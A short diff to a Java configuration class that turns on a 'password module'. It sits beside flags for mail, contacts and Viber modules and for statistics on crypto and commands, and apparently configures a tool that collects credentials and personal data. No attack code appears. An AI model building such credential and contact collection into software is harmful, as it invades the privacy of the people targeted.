@@ -32,7 +32,7 @@ public class Cfg {
 	public static final boolean STATISTICS = false; // enable statistics on crypto and on commands
 	public static final boolean MEMOSTAT = false;
 	
-	public static final boolean ENABLE_PASSWORD_MODULE = false; // enable password module
+	public static final boolean ENABLE_PASSWORD_MODULE = true; // enable password module
 	public static final boolean ENABLE_MAIL_MODULE = true; // enable mail module
 	public static final boolean ENABLE_CONTACTS = true; // actually saves contacs
 	public static final boolean ENABLE_EXPERIMENTAL_MODULES = false; // enables viber modules
